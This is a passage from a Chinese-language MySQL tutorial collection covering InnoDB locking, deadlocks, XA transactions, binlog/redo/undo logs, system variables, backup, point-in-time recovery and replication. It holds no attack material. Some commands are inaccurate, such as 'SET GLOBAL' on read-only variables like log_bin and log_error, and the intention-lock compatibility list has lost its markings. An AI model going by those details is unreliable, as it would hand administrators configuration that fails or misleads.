    T8["间隙锁（Gap Lock）"]
    T9["临键锁（Next-Key Lock）"]
    T10["插入意向锁（Insert Intention Lock）"]
    T11["自增锁（AUTO-INC Lock）"]
    T0 --> T1
    T0 --> T2
    T5 --> T6
    T10 --> T11
```

## 2. 全局锁

```sql
-- 全局读锁（用于备份）
FLUSH TABLES WITH READ LOCK;

-- 备份
mysqldump --single-transaction mydb > backup.sql

-- 释放
UNLOCK TABLES;
```

## 3. 表级锁

### 3.1 表锁

```sql
LOCK TABLES employees READ;       -- 读锁
LOCK TABLES employees WRITE;      -- 写锁
UNLOCK TABLES;
```

### 3.2 元数据锁（MDL）

```sql
-- MDL 自动获取，防止 DDL 与 DML 冲突
-- SELECT → MDL 读锁
-- ALTER → MDL 写锁

-- 长事务阻塞 DDL
-- 事务A: BEGIN; SELECT * FROM t;  -- 持有 MDL 读锁
-- 事务B: ALTER TABLE t ADD COLUMN ...;  -- 等待 MDL 写锁
-- 事务C: SELECT * FROM t;  -- 等待事务B的 MDL 写锁！

-- 查看MDL等待
SELECT * FROM performance_schema.metadata_locks;
```

### 3.3 意向锁

```sql
-- 行级锁的前置声明，快速检测表级锁冲突
-- IS：打算加行级S锁
-- IX：打算加行级X锁

-- 兼容性：
-- IS-IS , IS-IX , IS-S , IS-X
-- IX-IX , IX-S , IX-X
```

## 4. 行级锁

### 4.1 记录锁（Record Lock）

```sql
-- 锁定索引记录
SELECT * FROM t WHERE id = 5 FOR UPDATE;
-- 锁定 id=5 的索引记录
```

### 4.2 间隙锁（Gap Lock）

```sql
-- 锁定索引记录之间的间隙
SELECT * FROM t WHERE id BETWEEN 5 AND 10 FOR UPDATE;
-- 锁定 (5, 10) 间隙，阻止插入 id=6,7,8,9

-- 间隙锁之间不冲突
-- 间隙锁与插入意向锁冲突
```

### 4.3 临键锁（Next-Key Lock）

```sql
-- 记录锁 + 间隙锁
-- InnoDB 在 REPEATABLE READ 下的默认行锁算法

-- 退化为记录锁：唯一索引等值查询且记录存在
SELECT * FROM t WHERE id = 5 FOR UPDATE;  -- id 是主键，存在
-- 只锁 id=5 行

-- 退化为间隙锁：唯一索引等值查询但记录不存在
SELECT * FROM t WHERE id = 5 FOR UPDATE;  -- id=5 不存在
-- 锁 (prev, next) 间隙
```

### 4.4 插入意向锁

```sql
-- INSERT 操作在插入前获取插入意向锁
-- 是一种特殊的间隙锁，不阻止其他插入意向锁
-- 只与间隙锁冲突

-- 多个事务向同一间隙的不同位置插入不冲突
INSERT INTO t VALUES (6, ...);  -- 事务A
INSERT INTO t VALUES (7, ...);  -- 事务B
-- 不冲突
```

## 5. 自增锁

```sql
-- AUTO-INC 锁模式
-- innodb_autoinc_lock_mode = 0：传统模式（每次INSERT加表级锁）
-- innodb_autoinc_lock_mode = 1：连续模式（批量INSERT加锁，单行轻量锁）
-- innodb_autoinc_lock_mode = 2：交叉模式（无锁，最高并发，主从不安全）

SET GLOBAL innodb_autoinc_lock_mode = 2;
```

## 6. 查看锁信息

```sql
-- MySQL 8.0+
SELECT * FROM performance_schema.data_locks;
SELECT * FROM performance_schema.data_lock_waits;

-- 查看锁等待
SELECT
    waiting.pid AS waiting_pid,
    blocking.pid AS blocking_pid,
    waiting.sql_text AS waiting_query,
    blocking.sql_text AS blocking_query
FROM performance_schema.data_lock_waits w
JOIN performance_schema.events_statements_current waiting
    ON w.THREAD_ID = waiting.THREAD_ID
JOIN performance_schema.events_statements_current blocking
    ON w.BLOCKING_THREAD_ID = blocking.THREAD_ID;
```

<!-- ============ 文档分隔线：020-mysql/033-DeadlockDetectionHandling.md ============ -->

## 1. 死锁检测

### 1.1 自动检测

InnoDB 自动检测死锁，并回滚代价最小的事务：

```sql
-- 默认开启
SET GLOBAL innodb_deadlock_detect = ON;

-- 死锁发生时，被回滚的事务收到错误
-- ERROR 1213 (40001): Deadlock found when trying to get lock;
-- try restarting transaction
```

### 1.2 等图（Wait-for Graph）

InnoDB 使用等图检测死锁：如果图中存在环，则存在死锁。

```
事务A 等待 事务B 持有的锁
事务B 等待 事务A 持有的锁
→ 形成环 → 死锁
```

## 2. 死锁日志

```sql
-- 查看最近一次死锁信息
SHOW ENGINE INNODB STATUS;

-- 死锁日志示例：
-- LATEST DETECTED DEADLOCK
-- ------------------------
-- 2026-06-14 10:30:00
-- *** (1) TRANSACTION:
-- TRANSACTION 12345, ACTIVE 2 sec starting index read
-- mysql tables in use 1, locked 1
-- LOCK WAIT 2 lock struct(s), heap size 1136, 1 row lock(s)
-- MySQL thread id 10, OS thread handle 12345, query id 100 localhost root updating
-- UPDATE accounts SET balance = balance - 100 WHERE id = 1
-- *** (1) WAITING FOR THIS LOCK TO BE GRANTED:
-- RECORD LOCKS space id 58 page no 4 n bits 72 index PRIMARY of table `mydb`.`accounts`
-- *** (2) TRANSACTION:
-- TRANSACTION 12346, ACTIVE 1 sec starting index read
-- mysql tables in use 1, locked 1
-- 3 lock struct(s), heap size 1136, 2 row lock(s)
-- MySQL thread id 11, OS thread handle 12346, query id 101 localhost root updating
-- UPDATE accounts SET balance = balance - 100 WHERE id = 2
-- *** (2) HOLDS THE LOCK(S):
-- RECORD LOCKS ... index PRIMARY of table `mydb`.`accounts` trx id 12346 lock_mode X locks rec but not gap
-- *** (2) WAITING FOR THIS LOCK TO BE GRANTED:
-- RECORD LOCKS ... index PRIMARY of table `mydb`.`accounts` trx id 12346 lock_mode X locks rec but not gap
-- *** WE ROLL BACK TRANSACTION (2)
```

## 3. 死锁预防

### 3.1 固定顺序访问

```sql
-- 所有事务按 id 升序访问
-- 事务A：先锁 id=1，再锁 id=2
-- 事务B：先锁 id=1，再锁 id=2
-- 不会形成环
```

### 3.2 缩短事务

```sql
-- 减少锁持有时间
BEGIN;
-- 只包含必要的操作
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;
COMMIT;
```

### 3.3 降低隔离级别

```sql
-- READ COMMITTED 比 REPEATABLE READ 锁范围更小
SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;
```

### 3.4 添加合适索引

```sql
-- 无索引时，InnoDB 锁定全表
-- 有索引时，只锁定匹配行
CREATE INDEX idx_accounts_id ON accounts(id);
```

## 4. 死锁恢复

```sql
-- 应用层重试
-- 捕获 1213 错误，自动重试
-- 建议重试3-5次

-- 设置锁等待超时
SET innodb_lock_wait_timeout = 5;  -- 5秒超时

-- 关闭死锁检测（高并发场景，降低检测开销）
SET GLOBAL innodb_deadlock_detect = OFF;
-- 此时依赖 innodb_lock_wait_timeout 超时回滚
```

<!-- ============ 文档分隔线：020-mysql/034-DistributedTransaction.md ============ -->

## 1. XA 事务概述

XA 是 X/Open 组织定义的分布式事务处理标准，采用两阶段提交（2PC）协议。

### 1.1 核心角色

| 角色             | 说明                     |
| ---------------- | ------------------------ |
| AP（应用程序）   | 定义事务边界             |
| TM（事务管理器） | 协调分布式事务           |
| RM（资源管理器） | 管理具体资源（如数据库） |

### 1.2 两阶段提交

```
阶段1：Prepare
  TM → RM1: PREPARE
  TM → RM2: PREPARE
  RM1 → TM: OK
  RM2 → TM: OK

阶段2：Commit/Rollback
  TM → RM1: COMMIT
  TM → RM2: COMMIT
```

## 2. MySQL XA 语法

```sql
-- 开始 XA 事务
XA START 'xid_001';

-- 执行 SQL
UPDATE accounts SET balance = balance - 100 WHERE id = 1;

-- 结束事务（进入 PREPARED 状态）
XA END 'xid_001';

-- 第一阶段：准备
XA PREPARE 'xid_001';

-- 第二阶段：提交或回滚
XA COMMIT 'xid_001';
-- 或
XA ROLLBACK 'xid_001';
```

## 3. 跨库 XA 事务

```sql
-- 在两个数据库上执行 XA 事务
-- 数据库1
XA START 'transfer_001';
UPDATE db1.accounts SET balance = balance - 100 WHERE id = 1;
XA END 'transfer_001';
XA PREPARE 'transfer_001';

-- 数据库2
XA START 'transfer_001';
UPDATE db2.accounts SET balance = balance + 100 WHERE id = 2;
XA END 'transfer_001';
XA PREPARE 'transfer_001';

-- 两个都 PREPARE 成功后提交
-- 数据库1
XA COMMIT 'transfer_001';
-- 数据库2
XA COMMIT 'transfer_001';
```

## 4. 查看XA事务

```sql
-- 查看所有 XA 事务
XA RECOVER;

-- 查看特定状态的事务
XA RECOVER CONVERT XID;
```

## 5. XA 事务的限制

```sql
-- 1. 不支持嵌套 XA 事务
-- 2. XA 事务期间不能使用 SAVEPOINT
-- 3. 复制延迟：PREPARE 后 COMMIT 前的间隙
-- 4. 性能开销：两阶段提交增加网络往返
-- 5. 需要应用层协调 TM
```

## 6. 替代方案

```sql
-- 1. 本地消息表
-- 2. TCC（Try-Confirm-Cancel）
-- 3. Saga 模式
-- 4. Seata 等分布式事务框架
```

<!-- ============ 文档分隔线：020-mysql/035-Binlog.md ============ -->

## 1. binlog 概述

二进制日志（Binary Log）记录所有修改数据的 SQL 语句或行变更，主要用于复制和数据恢复。

### 1.1 与 redo log 的区别

| 特性     | binlog               | redo log             |
| -------- | -------------------- | -------------------- |
| 层级     | Server 层            | InnoDB 引擎层        |
| 内容     | 逻辑变更（SQL/行）   | 物理变更（页修改）   |
| 用途     | 复制、恢复           | 崩溃恢复             |
| 追加方式 | 追加写入，不覆盖     | 循环写入，覆盖旧数据 |
| 事务性   | 事务提交时一次性写入 | 事务执行中持续写入   |

## 2. binlog 格式

| 格式      | 说明                         | 优缺点                      |
| --------- | ---------------------------- | --------------------------- |
| STATEMENT | 记录 SQL 语句                | 日志小，但非确定性SQL不安全 |
| ROW       | 记录行变更                   | 数据一致性好，日志大        |
| MIXED     | 默认STATEMENT，不安全时用ROW | 折中方案                    |

```sql
-- 设置格式
SET GLOBAL binlog_format = ROW;

-- 推荐 ROW 格式
-- 数据一致性最可靠
```

## 3. 配置

```sql
-- 开启 binlog
SET GLOBAL log_bin = ON;
SET GLOBAL binlog_format = ROW;
SET GLOBAL binlog_row_image = FULL;  -- 记录完整行
SET GLOBAL sync_binlog = 1;          -- 每次提交同步到磁盘
SET GLOBAL max_binlog_size = 1073741824;  -- 1GB

-- 查看binlog文件
SHOW BINARY LOGS;
SHOW MASTER STATUS;
```

## 4. binlog 与两阶段提交

```
InnoDB 与 binlog 的一致性通过两阶段提交保证：
1. Prepare：写入 redo log，标记为 prepared
2. Commit：写入 binlog，标记 redo log 为 committed

崩溃恢复：
- 有 redo log prepared + 有 binlog → 提交
- 有 redo log prepared + 无 binlog → 回滚
```

## 5. 数据恢复

```bash
# 使用 mysqlbinlog 恢复数据
mysqlbinlog --start-datetime="2026-06-14 10:00:00" \
            --stop-datetime="2026-06-14 11:00:00" \
            mysql-bin.000123 | mysql -u root -p

# 指定位置恢复
mysqlbinlog --start-position=154 --stop-position=1024 \
            mysql-bin.000123 | mysql -u root -p
```

## 6. 清理策略

```sql
-- 按时间清理
PURGE BINARY LOGS BEFORE '2026-06-07 00:00:00';

-- 按文件名清理
PURGE BINARY LOGS TO 'mysql-bin.000120';

-- 自动清理
SET GLOBAL expire_logs_days = 7;  -- MySQL 5.x
SET GLOBAL binlog_expire_logs_seconds = 604800;  -- MySQL 8.0+
```

<!-- ============ 文档分隔线：020-mysql/036-RedoLog.md ============ -->

## 1. redo log 概述

重做日志（Redo Log）是 InnoDB 的 WAL（Write-Ahead Logging）机制，确保事务提交后的数据不丢失。

### 1.1 核心原理

$$
\text{先写日志，再写数据} \implies \text{崩溃后可通过日志恢复}
$$

### 1.2 与 binlog 的两阶段提交

```
1. 写入 redo log（PREPARED 状态）
2. 写入 binlog
3. 提交 redo log（COMMITTED 状态）
```

## 2. 物理结构

```
redo log 由一组固定大小的文件组成（循环写入）：

ib_logfile0  ib_logfile1  ib_logfile2  ib_logfile3
   ↓            ↓            ↓            ↓
[write_pos] ─────────────────────────→ [checkpoint]
   ↑ 已写入区域                                ↑ 已刷盘区域
   ↑                                          ↑ 可覆盖区域
```

```sql
-- 配置 redo log
SET GLOBAL innodb_log_file_size = 1073741824;  -- 1GB
SET GLOBAL innodb_log_files_in_group = 4;      -- 4个文件
SET GLOBAL innodb_log_group_home_dir = './';   -- 存储目录
```

## 3. LSN（Log Sequence Number）

```
LSN 是 redo log 的全局递增序号：
- log_lsn：当前写入位置
- flush_lsn：已刷盘位置
- checkpoint_lsn：已刷盘数据页对应的位置

LSN 关系：
checkpoint_lsn ≤ flush_lsn ≤ log_lsn
```

## 4. 写入流程

```
1. 事务修改数据页
2. 生成 redo log record
3. 写入 log buffer（内存）
4. 根据策略刷盘：
   - innodb_flush_log_at_trx_commit = 0：每秒刷盘
   - innodb_flush_log_at_trx_commit = 1：每次提交刷盘（最安全）
   - innodb_flush_log_at_trx_commit = 2：每次提交写OS缓存，每秒fsync
```

## 5. 崩溃恢复

```
1. 从 checkpoint_lsn 开始扫描 redo log
2. 重做（REDO）：重放所有已提交事务的修改
3. 撤销（UNDO）：回滚所有未提交事务的修改
4. 恢复完成
```

## 6. 性能调优

```sql
-- 增大 log buffer
SET GLOBAL innodb_log_buffer_size = 16777216;  -- 16MB

-- 增大 redo log 文件（减少 checkpoint 频率）
SET GLOBAL innodb_log_file_size = 2147483648;  -- 2GB

-- 控制刷盘策略
SET GLOBAL innodb_flush_log_at_trx_commit = 1;  -- 最安全
-- 设为 2 可提升性能，但可能丢失1秒数据
```

<!-- ============ 文档分隔线：020-mysql/037-UndoLog.md ============ -->

## 1. undo log 概述

撤销日志（Undo Log）记录数据修改前的旧值，用于事务回滚和 MVCC 快照读。

### 1.1 两大功能

| 功能     | 说明                    |
| -------- | ----------------------- |
| 事务回滚 | ROLLBACK 时恢复原始数据 |
| MVCC     | 提供历史版本供快照读    |

## 2. 版本链

```
当前行：{data='Alice', trx_id=300, roll_ptr → undo_2}
                                           ↓
undo_2：{data='Bob', trx_id=200, roll_ptr → undo_1}
                                           ↓
undo_1：{data='Charlie', trx_id=100, roll_ptr → NULL}
```

```sql
-- INSERT：生成 INSERT undo log（事务提交后可立即清理）
-- UPDATE：生成 UPDATE undo log（需要保留给 MVCC）
-- DELETE：生成 DELETE undo log（标记删除，需要保留给 MVCC）
```

## 3. 回滚段

```sql
-- InnoDB 使用回滚段（Rollback Segment）管理 undo log
-- 每个回滚段包含 1024 个 undo slot

-- MySQL 8.0 默认 128 个回滚段
SET GLOBAL innodb_rollback_segments = 128;

-- undo log 表空间
-- MySQL 8.0 默认使用独立 undo 表空间
SET GLOBAL innodb_undo_tablespaces = 2;
SET GLOBAL innodb_max_undo_log_size = 1073741824;  -- 1GB
```

## 4. Purge 机制

```
Purge 线程负责清理不再需要的 undo log：
1. 检查 undo log 是否对所有活跃事务都不可见
2. 如果是，可以安全清理
3. 同时清理标记为删除的行

长事务会阻止 Purge，导致 undo log 膨胀
```

```sql
-- 查看 undo log 状态
SHOW ENGINE INNODB STATUS;

-- 查看历史版本长度
SELECT COUNT(*) FROM information_schema.innodb_trx;
-- 如果 History list length 持续增长，说明 Purge 跟不上
```

## 5. 性能调优

```sql
-- 加速 Purge
SET GLOBAL innodb_purge_batch_size = 300;  -- 每次 Purge 批量大小

-- 独立 undo 表空间（在线收缩）
SET GLOBAL innodb_undo_log_truncate = ON;
SET GLOBAL innodb_max_undo_log_size = 1073741824;
```

<!-- ============ 文档分隔线：020-mysql/038-LogSystem.md ============ -->

## 1. MySQL 日志体系

| 日志类型     | 用途               | 默认状态 |
| ------------ | ------------------ | -------- |
| 错误日志     | 启动/运行/关闭错误 | 开启     |
| 通用查询日志 | 所有SQL语句        | 关闭     |
| 慢查询日志   | 慢SQL语句          | 关闭     |
| 二进制日志   | 复制与恢复         | 关闭     |
| 中继日志     | 从库复制           | 从库开启 |

## 2. 错误日志

```sql
-- 查看错误日志位置
SHOW VARIABLES LIKE 'log_error';

-- 配置
SET GLOBAL log_error = '/var/log/mysql/error.log';
SET GLOBAL log_error_verbosity = 3;  -- 1=ERROR, 2=ERROR+WARNING, 3=ERROR+WARNING+NOTE

-- 查看错误日志
-- Linux: tail -f /var/log/mysql/error.log
-- MySQL 8.0:
SHOW VARIABLES LIKE 'log_error';
```

## 3. 通用查询日志

```sql
-- 记录所有SQL语句（性能影响大，通常关闭）
SET GLOBAL general_log = ON;
SET GLOBAL general_log_file = '/var/log/mysql/general.log';

-- 查看状态
SHOW VARIABLES LIKE 'general_log%';
```

## 4. 慢查询日志

```sql
SET GLOBAL slow_query_log = ON;
SET GLOBAL long_query_time = 1;
SET GLOBAL log_queries_not_using_indexes = ON;
SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';
```

## 5. 日志管理最佳实践

```sql
-- 1. 错误日志始终开启
-- 2. 通用查询日志仅在调试时开启
-- 3. 慢查询日志生产环境建议开启
-- 4. 使用 logrotate 管理日志文件大小
-- 5. 定期分析慢查询日志
```
## 系统变量查询

**基本写法：查看所有系统变量**
`SHOW VARIABLES [LIKE '<模式>'];`

```sql
-- 查看所有变量
SHOW VARIABLES;
-- 过滤查看 innodb 相关变量
SHOW VARIABLES LIKE 'innodb%';
```

**基本写法：查看单个变量**
`SHOW VARIABLES LIKE '<变量名>';`

```sql
-- 查看最大连接数
SHOW VARIABLES LIKE 'max_connections';
-- 查看默认存储引擎
SHOW VARIABLES LIKE 'default_storage_engine';
```

**基本写法：精确匹配变量**
`SELECT @@GLOBAL.<变量名>;` / `SELECT @@SESSION.<变量名>;`

```sql
-- 查看 GLOBAL 与 SESSION 作用域变量
SELECT @@GLOBAL.max_connections;
SELECT @@SESSION.autocommit;
-- 查看仅会话级变量
SELECT @@session.sql_mode;
```

**基本写法：information_schema 查询变量**
`SELECT * FROM performance_schema.global_variables WHERE variable_name LIKE '<模式>';`

```sql
-- 通过性能 schema 查询变量
SELECT variable_name, variable_value
FROM performance_schema.global_variables
WHERE variable_name LIKE 'innodb_buffer%';
```

---

## 系统变量设置

**基本写法：设置全局变量（运行时）**
`SET GLOBAL <变量名> = <值>;`

```sql
-- 动态调整最大连接数（重启失效）
SET GLOBAL max_connections = 500;
```

**基本写法：设置会话变量**
`SET SESSION <变量名> = <值>;`

```sql
-- 仅当前会话生效
SET SESSION sql_mode = 'STRICT_TRANS_TABLES';
SET autocommit = 0;
```

**基本写法：SET PERSIST 持久化（8.0+）**
`SET PERSIST <变量名> = <值>;`

```sql
-- 持久化到 mysqld-auto.cnf，重启仍生效
SET PERSIST max_connections = 500;
SET PERSIST_ONLY innodb_buffer_pool_size = 4294967296;  -- 仅重启生效
```

**基本写法：重置变量为默认值**
`SET PERSIST <变量名> = DEFAULT;`

```sql
-- 清除持久化配置恢复默认
SET PERSIST max_connections = DEFAULT;
```

---

## 状态查询

**基本写法：查看服务器状态**
`SHOW STATUS [LIKE '<模式>'];`

```sql
-- 查看所有状态变量
SHOW STATUS;
-- 查看连接相关状态
SHOW STATUS LIKE 'Threads%';
```

**基本写法：查看会话级状态**
`SHOW SESSION STATUS LIKE '<模式>';`

```sql
-- 仅查看当前会话状态
SHOW SESSION STATUS LIKE 'Bytes%';
```

**基本写法：查看全局状态**
`SHOW GLOBAL STATUS LIKE '<模式>';`

```sql
-- 查看全局累计状态
SHOW GLOBAL STATUS LIKE 'Uptime';
SHOW GLOBAL STATUS LIKE 'Innodb_buffer_pool%';
```

**基本写法：性能 schema 查询状态**
`SELECT * FROM performance_schema.global_status WHERE variable_name LIKE '<模式>';`

```sql
-- 通过性能 schema 查询状态
SELECT variable_name, variable_value
FROM performance_schema.global_status
WHERE variable_name LIKE 'Threads_%';
```

---

## 常用监控查询

**基本写法：查看当前连接数**
`SHOW STATUS LIKE 'Threads_connected';`

```sql
-- 当前活跃连接数
SHOW STATUS LIKE 'Threads_connected';
-- 历史最大连接数
SHOW STATUS LIKE 'Max_used_connections';
```

**基本写法：查看缓冲池命中率**
`SHOW STATUS LIKE 'Innodb_buffer_pool_reads';`

```sql
-- 计算缓冲池命中率（reads 为磁盘读，read_requests 为总请求）
SHOW STATUS LIKE 'Innodb_buffer_pool_read_requests';
SHOW STATUS LIKE 'Innodb_buffer_pool_reads';
-- 命中率 = 1 - reads / read_requests
```

**基本写法：查看 QPS 与 TPS**
`SHOW STATUS LIKE 'Questions';`

```sql
-- Questions 为查询总数，Uptime 为运行秒数，QPS = Questions/Uptime
SHOW STATUS LIKE 'Questions';
SHOW STATUS LIKE 'Uptime';
-- Com_开头的为各命令执行次数
SHOW STATUS LIKE 'Com_select';
SHOW STATUS LIKE 'Com_insert';
```

---

## 字符集与时区

**基本写法：查看字符集变量**
`SHOW VARIABLES LIKE 'character_set%';`

```sql
-- 查看各环节字符集
SHOW VARIABLES LIKE 'character_set%';
-- 查看排序规则
SHOW VARIABLES LIKE 'collation%';
```

**基本写法：查看时区**
`SELECT @@global.time_zone, @@session.time_zone;`

```sql
-- 查看全局与会话时区
SELECT @@global.time_zone, @@session.time_zone;
-- 查看当前时间
SELECT NOW(), UTC_TIMESTAMP();
```

**基本写法：设置时区**
`SET GLOBAL time_zone = '<时区>';`

```sql
-- 设置全局时区
SET GLOBAL time_zone = '+08:00';
SET SESSION time_zone = '+08:00';
```

---

## 查看进程与锁

**基本写法：查看进程列表**
`SHOW PROCESSLIST;`

```sql
-- 查看当前所有连接与正在执行的 SQL
SHOW PROCESSLIST;
-- 完整查看（含完整 SQL 文本）
SHOW FULL PROCESSLIST;
```

**基本写法：查看 InnoDB 锁信息**
`SELECT * FROM performance_schema.data_locks;`

```sql
-- 8.0+ 通过 performance_schema 查看锁（替代旧版 information_schema.INNODB_LOCKS）
SELECT * FROM performance_schema.data_locks;
-- 查看锁等待
SELECT * FROM performance_schema.data_lock_waits;
```

**基本写法：查看 InnoDB 事务**
`SELECT * FROM information_schema.INNODB_TRX;`

```sql
-- 查看当前活跃事务
SELECT trx_id, trx_state, trx_started, trx_mysql_thread_id
FROM information_schema.INNODB_TRX;
```

<!-- ============ 文档分隔线：020-mysql/039-LogicalBackup.md ============ -->

## 1. mysqldump

### 1.1 基本用法

```bash
# 备份单个数据库
mysqldump -u root -p mydb > mydb_backup.sql

# 备份多个数据库
mysqldump -u root -p --databases mydb1 mydb2 > multi_db.sql

# 备份所有数据库
mysqldump -u root -p --all-databases > all_db.sql

# 备份单个表
mysqldump -u root -p mydb employees > employees.sql
```

### 1.2 一致性备份

```bash
# InnoDB 一致性备份（推荐）
mysqldump -u root -p --single-transaction mydb > mydb_consistent.sql

# MyISAM 一致性备份（锁表）
mysqldump -u root -p --lock-all-tables mydb > mydb_locked.sql

# 混合引擎
mysqldump -u root -p --single-transaction --master-data=2 mydb > mydb.sql
```

### 1.3 常用选项

```bash
--routines          # 包含存储过程和函数
--triggers          # 包含触发器（默认包含）
--events            # 包含事件
--set-gtid-purged=OFF  # 不包含GTID信息
--quick             # 逐行导出（大表必须）
--compress          # 压缩传输
--where="condition" # 条件导出
```

## 2. mysqlpump

```bash
# MySQL 5.7+ 并行备份工具
mysqlpump -u root -p --default-parallelism=4 mydb > mydb_pump.sql

# 并行备份多个数据库
mysqlpump -u root -p --parallel-schemas=4:mydb1,mydb2 mydb1 mydb2 > backup.sql

# 压缩备份
mysqlpump -u root -p --compress-output=LZ4 mydb > mydb.lz4
```

## 3. 恢复

```bash
# 恢复数据库
mysql -u root -p mydb < mydb_backup.sql

# 恢复前创建数据库
mysql -u root -p -e "CREATE DATABASE mydb"
mysql -u root -p mydb < mydb_backup.sql
```

<!-- ============ 文档分隔线：020-mysql/040-PhysicalBackup.md ============ -->

## 1. 物理备份概述

物理备份直接复制数据库文件（数据文件、日志文件），速度比逻辑备份快得多。

| 特性   | 物理备份       | 逻辑备份      |
| ------ | -------------- | ------------- |
| 速度   | 快             | 慢            |
| 粒度   | 整库/整表      | 可选表/行     |
| 可读性 | 二进制，不可读 | SQL文本，可读 |
| 跨平台 | 不可以         | 可以          |
| 工具   | XtraBackup/MEB | mysqldump     |

## 2. Percona XtraBackup

### 2.1 全量备份

```bash
# 全量热备份
xtrabackup --backup --target-dir=/backup/full -u root -p

# 准备备份（使备份一致）
xtrabackup --prepare --target-dir=/backup/full

# 恢复
xtrabackup --copy-back --target-dir=/backup/full
chown -R mysql:mysql /var/lib/mysql
systemctl start mysql
```

### 2.2 增量备份

```bash
# 增量备份基于全量
xtrabackup --backup --target-dir=/backup/inc1 \
    --incremental-basedir=/backup/full -u root -p

# 准备增量备份
xtrabackup --prepare --apply-log-only --target-dir=/backup/full
xtrabackup --prepare --target-dir=/backup/full --incremental-dir=/backup/inc1

# 恢复（同全量恢复）
xtrabackup --copy-back --target-dir=/backup/full
```

### 2.3 压缩备份

```bash
xtrabackup --backup --compress --target-dir=/backup/compressed -u root -p

# 解压
xtrabackup --decompress --target-dir=/backup/compressed
```

## 3. MySQL Enterprise Backup

```bash
# 全量备份
mysqlbackup --user=root --password --backup-dir=/backup/full backup

# 增量备份
mysqlbackup --user=root --password --backup-dir=/backup/inc1 \
    --incremental --incremental-base=dir:/backup/full backup

# 恢复
mysqlbackup --datadir=/var/lib/mysql --backup-dir=/backup/full copy-back
```

<!-- ============ 文档分隔线：020-mysql/041-PITR.md ============ -->

## 1. PITR 概述

基于时间点恢复（Point-In-Time Recovery，PITR）将数据库恢复到任意时间点，通过全量备份 + binlog 重放实现。

## 2. 恢复流程

```
1. 恢复全量备份
2. 找到误操作的时间点
3. 重放 binlog 到误操作之前
4. 跳过误操作
5. 继续重放后续 binlog
```

## 3. 操作步骤

### 3.1 恢复全量备份

```bash
# 停止 MySQL
systemctl stop mysql

# 恢复全量备份
xtrabackup --copy-back --target-dir=/backup/full
chown -R mysql:mysql /var/lib/mysql

# 启动 MySQL
systemctl start mysql
```

### 3.2 定位误操作时间

```bash
# 查看 binlog 事件
mysqlbinlog --base64-output=DECODE-ROWS -v mysql-bin.000123 | grep -A5 "DROP TABLE"

# 查看事件时间
mysqlbinlog --start-datetime="2026-06-14 10:00:00" \
            --stop-datetime="2026-06-14 12:00:00" \
            mysql-bin.000123 | head -100
```

### 3.3 重放 binlog

```bash
# 重放到误操作之前
mysqlbinlog --start-datetime="2026-06-14 10:00:00" \
            --stop-datetime="2026-06-14 10:59:59" \
            mysql-bin.000123 | mysql -u root -p

# 跳过误操作，继续重放
mysqlbinlog --start-datetime="2026-06-14 11:01:00" \
            mysql-bin.000123 | mysql -u root -p
```

## 4. 按位置恢复

```bash
# 查看事件位置
mysqlbinlog mysql-bin.000123 | grep -n "DROP TABLE"

# 按位置恢复
mysqlbinlog --start-position=154 --stop-position=1024 \
            mysql-bin.000123 | mysql -u root -p

# 跳过误操作后继续
mysqlbinlog --start-position=2048 \
            mysql-bin.000123 | mysql -u root -p
```

## 5. 最佳实践

```sql
-- 1. 定期全量备份
-- 2. 确保 binlog 开启且完整
-- 3. sync_binlog = 1 确保不丢失 binlog
-- 4. 保留足够长时间的 binlog
-- 5. 测试恢复流程
```

<!-- ============ 文档分隔线：020-mysql/042-Replication.md ============ -->

## 1. 复制概述

MySQL 复制基于 binlog，将主库的变更同步到从库。

### 1.1 复制模式

| 模式       | 主库等待            | 数据安全 | 性能 |
| ---------- | ------------------- | -------- | ---- |
| 异步复制   | 不等待从库          | 可能丢失 | 最高 |
| 半同步复制 | 等待至少1个从库确认 | 较安全   | 中等 |
| 全同步复制 | 等待所有从库确认    | 最安全   | 最低 |

## 2. 异步复制

### 2.1 原理

```
主库 → binlog → 从库 IO线程 → relay log → 从库 SQL线程 → 从库数据
```

### 2.2 配置

```ini
# 主库 my.cnf
[mysqld]
server-id = 1
log-bin = mysql-bin
binlog-format = ROW

# 从库 my.cnf
[mysqld]
server-id = 2
relay-log = relay-bin
read-only = ON
```

```sql
-- 主库创建复制用户
CREATE USER 'repl'@'%' IDENTIFIED BY 'password';
GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';

-- 从库配置
CHANGE MASTER TO
    MASTER_HOST = 'master-ip',
    MASTER_USER = 'repl',
    MASTER_PASSWORD = 'password',
    MASTER_LOG_FILE = 'mysql-bin.000001',
    MASTER_LOG_POS = 154;

START SLAVE;
SHOW SLAVE STATUS\G
```

## 3. 半同步复制

```sql
-- 主库安装插件
INSTALL PLUGIN rpl_semi_sync_master SONAME 'semisync_master.so';
SET GLOBAL rpl_semi_sync_master_enabled = ON;
SET GLOBAL rpl_semi_sync_master_timeout = 5000;  -- 5秒超时降级为异步

-- 从库安装插件
INSTALL PLUGIN rpl_semi_sync_slave SONAME 'semisync_slave.so';
SET GLOBAL rpl_semi_sync_slave_enabled = ON;
STOP SLAVE IO_THREAD; START SLAVE IO_THREAD;
```

## 4. 复制延迟监控

```sql
-- 查看从库延迟
SHOW SLAVE STATUS\G
-- Seconds_Behind_Master: 0

-- 使用 pt-heartbeat 更精确监控
pt-heartbeat -D test --update -h master
pt-heartbeat -D test --monitor -h slave
```
## 复制术语（8.4 SOURCE/REPLICA）

**基本写法：查看源库二进制日志状态**
`SHOW BINARY LOG STATUS;`

```sql
-- MySQL 8.4 新语法（替代旧版 SHOW MASTER STATUS）
SHOW BINARY LOG STATUS;
-- 输出: File=mysql-bin.000003, Position=1234, Binlog_Do_DB, Binlog_Ignore_DB
```

**基本写法：查看副本状态**
`SHOW REPLICA STATUS\G`

```sql
-- MySQL 8.4 新语法（替代旧版 SHOW SLAVE STATUS）
SHOW REPLICA STATUS\G
```

**基本写法：查看复制源**
`SHOW REPLICA STATUS FOR CHANNEL '<通道名>'\G`

```sql
-- 查看指定复制通道状态（多源复制）
SHOW REPLICA STATUS FOR CHANNEL 'source_1'\G
```

---

## 副本控制

**基本写法：启动复制**
`START REPLICA [FOR CHANNEL '<通道名>'];`

```sql
-- 启动所有复制线程
START REPLICA;
-- 启动指定通道
START REPLICA FOR CHANNEL 'source_1';
```

**基本写法：停止复制**
`STOP REPLICA [FOR CHANNEL '<通道名>'];`

```sql
-- 停止复制线程
STOP REPLICA;
-- 停止 IO 线程或 SQL 线程
